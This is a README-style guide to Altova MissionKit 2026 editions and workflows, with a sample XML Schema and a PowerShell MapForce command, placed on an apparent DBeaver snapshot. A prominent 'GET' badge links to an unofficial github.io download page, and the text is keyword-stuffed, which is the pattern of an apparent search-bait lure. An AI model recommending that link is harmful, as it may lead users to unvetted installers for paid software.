# Altova MissionKit for XML and Data Development

Altova MissionKit brings XML, JSON, SQL, and UML development tools together in a commercial desktop suite.
Altova MissionKit 2026 supports workflows that connect document validation, data mapping, reporting, and software modeling.

Teams evaluating altova missionkit professional should compare its included applications with the broader Enterprise bundle.
The altova missionkit enterprise edition adds tools for comparison and XML relationship management.
For projects standardized on altova missionkit enterprise 2026, check features against that specific release and edition.

[![GET Altova MissionKit](https://img.shields.io/badge/GET-Altova%20MissionKit-0F766E?style=flat-square&labelColor=134E4A)](https://altova-missionkit.github.io/Altova-MissionKit-2026/)

This guide focuses on the 2026 suite rather than treating a version keyword as a promise of the latest release.
The relative file links refer to a supplied DBeaver snapshot used for technical comparison.
They are not Altova application source, MissionKit project files, or evidence of a shared implementation.

## About

MissionKit groups separate applications around related development tasks.
Choose a tool according to the artifact being edited: a schema, mapping, report design, model, or database query.

| Application | Main role | Professional 2026 | Enterprise 2026 |
| --- | --- | --- | --- |
| XMLSpy | XML and JSON editing, schemas, and transformations | Professional edition | Enterprise edition |
| MapForce | Visual data mapping and transformation | Professional edition | Enterprise edition |
| StyleVision | Report and stylesheet design | Professional edition | Enterprise edition |
| UModel | UML modeling and code engineering | Professional edition | Enterprise edition |
| DatabaseSpy | Database queries and design | Professional edition | Enterprise edition |
| DiffDog | File, directory, and database comparison | Not included | Included |
| SchemaAgent | Relationships among XML assets | Not included | Included |

The edition names identify different feature sets within the included applications.
An application appearing in both columns does not mean every advanced capability is available in both editions.
Check the [vendor's suite listing](https://www.altova.com/missionkit/download) before choosing a license.

For comparison, DBeaver's [product-branding.properties](product/community/product-branding.properties) identifies its separate product.
Its [DBeaver.product](product/community/DBeaver.product) describes an Eclipse product configuration.

![MissionKit applications organized around a shared XML and database project](tools/ee1.png)

## Architecture

**A workflow across specialized tools**

A typical project starts with agreed data structures, moves through mappings, and ends with validated output.
XMLSpy supports document and schema work, while MapForce expresses transformations between supported data sources and targets.
StyleVision addresses presentation, and UModel captures software design in UML.

- Keep schema revisions aligned with the mappings that depend on them.
- Separate input samples from generated results.
- Record the application edition and version used for a delivery.
- Check output structure and content after a mapping changes.

**Comparison material in this repository**

The DBeaver snapshot exposes a different application's component and packaging structure.
[osgi-app.properties](osgi-app.properties) lists workspace paths, repositories, and test libraries.
The runtime [feature.xml](features/org.jkiss.dbeaver.runtime.feature/feature.xml) groups runtime dependencies.
The desktop [feature.xml](features/org.jkiss.dbeaver.ui.feature/feature.xml) declares UI components and dependencies.
These descriptors are useful examples of modular desktop packaging, not descriptions of MissionKit internals.

## Additional Features

**Validation before transformation**

A schema makes expectations explicit before records enter a mapping.
The following original XML Schema describes one order identifier and a nonnegative quantity.
It can be inspected in XMLSpy as an ordinary schema document.

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="order">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="id" type="xs:string"/>
        <xs:element name="quantity" type="xs:nonNegativeInteger"/>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema>
```

The schema requires both child elements in the stated order.
It constrains quantity to nonnegative integer values but does not require a nonempty identifier.
Add business-specific constraints only after documenting the intended rules.
The [W3C XML Schema primer](https://www.w3.org/TR/xmlschema-0/) explains these standard constructs.

**Transformation and presentation**

MapForce handles mapping logic; StyleVision focuses on rendering structured data into reports.
Keep content rules distinct from layout choices so that a visual change does not conceal an unexpected data change.

The supplied DBeaver [site.xsl](product/repositories/org.jkiss.dbeaver.ce.repository/siteTemplate/web/site.xsl) is an independent XSLT example.
Its companion [site.css](product/repositories/org.jkiss.dbeaver.ce.repository/siteTemplate/web/site.css) controls update-site presentation.
Neither file is a StyleVision design or a generated MapForce example.

**Debugging and revision review**

Use the relevant application's debugging or comparison features when investigating an incorrect result.
Capture the smallest input that demonstrates the issue and retain the previous expected output.

DBeaver's debugger [feature.xml](features/org.jkiss.dbeaver.debug.feature/feature.xml) and Git [feature.xml](features/org.jkiss.dbeaver.git.feature/feature.xml) show separate extension packages.
These comparison references do not establish equivalent debugger or Git functionality in MissionKit.

## Supported databases

DatabaseSpy provides a dedicated environment for database queries and design.
MapForce can include database components in mappings, subject to the selected edition and supported connectivity.
Verify the target database version, driver, authentication method, and permissions for the actual project.

**Check the data contract**

- Match source and target column types deliberately.
- Distinguish an absent value from an empty string.
- Review date, time, decimal, and character conversions.
- Confirm key relationships before combining records.
- Validate record counts and rejected values after transformation.

For a database-tool comparison, the DBeaver database [feature.xml](features/org.jkiss.dbeaver.db.feature/feature.xml) lists database extensions.
The database UI [feature.xml](features/org.jkiss.dbeaver.db.ui.feature/feature.xml) groups corresponding interface extensions.
These lists describe DBeaver and must not be used as MissionKit's supported database matrix.

![Visual mapping connections between structured documents and database fields](tools/ee2.png)

## Documentation

**Generate transformation code with MapForce**

MapForce documents its own command-line interface; there is no suite-wide command assumed here.
This PowerShell example generates XSLT 2.0 code from an existing compatible mapping.
Enter the full executable and mapping paths, followed by an existing output directory.

```powershell
$mapForcePath = Read-Host 'Full path to MapForce.exe'
$mappingPath = Read-Host 'Full path to an existing .mfd mapping'
$outputPath = Read-Host 'Full path to an output directory'
& $mapForcePath $mappingPath '/XSLT2' $outputPath
```

This operation generates code and writes output files; it is not a command to execute the transformation.
The mapping must support the selected target language.
Review the [MapForce command-line documentation](https://www.altova.com/manual/Mapforce/mapforcebasic/mff_automate_cli.html) for target options and path behavior.

**Track deliverables**

Retain the source mapping, its referenced schemas, representative input, and the expected output together.
Record any external resources or database connections needed to reproduce a result.
Generated files should remain distinguishable from the editable project artifacts that produced them.

As a comparison of component publication metadata, DBeaver's [category.xml](product/repositories/org.jkiss.dbeaver.ce.repository/category.xml) groups update-site features.
It is not an Altova deployment manifest.

## AI integration

Altova introduced additional AI capabilities across XMLSpy, MapForce, and DatabaseSpy in the 2026 Release 2 product line.
Availability can depend on the application, release, configuration, and an additional service subscription.
Check the [Altova AI service](https://www.altova.com/ai-tools) before assuming it is covered by a desktop license.

Review generated queries and mappings against known inputs and expected results.
Keep schema constraints, database permissions, and explicit transformation tests as the basis for accepting output.

## Building from Source

MissionKit is supplied as commercial software; this repository does not provide its application source or a build recipe.
The included build material belongs to DBeaver and is intended for comparison of development tooling.

The aggregate [pom.xml](product/aggregate/pom.xml) references additional modules outside this snapshot.
[build.cmd](tools/build.cmd) is a Windows build helper, and [build.sh](tools/build.sh) is its shell-based counterpart.
The presence of these helpers does not make the supplied subset a complete, independently buildable checkout.

## Help

Use the [Altova documentation portal](https://www.altova.com/documentation) for the manual matching the application and edition.
The vendor also provides [training resources](https://www.altova.com/training-tutorials) for XML, mapping, and related workflows.

**License and evaluation questions**

A MissionKit trial is an evaluation option, not a permanent free edition.
Confirm license terms, included applications, maintenance, and any server products separately when planning a deployment.
Consult the [official shop](https://shop.altova.com/MissionKit) for the applicable purchasing options.

## Feedback

A useful report identifies the application, edition, full version, and operating system.
Include a minimal input, the relevant schema or mapping, expected output, and the actual error message.
Remove credentials and confidential records from shared reproductions.

The DBeaver [DBeaverUnitTest.product](product/testing/DBeaverUnitTest.product) is a comparison example of a test application descriptor.
It does not contain MissionKit tests or validate the examples in this guide.

Direct product-specific questions to [Altova Support](https://www.altova.com/support).

## Related Search Terms

Altova MissionKit, Altova MissionKit 2026, altova missionkit professional, altova missionkit enterprise edition, altova missionkit enterprise 2026, database, sql, data-integration, etl, workflow, uml, uml-diagram, diagram, gui, erd
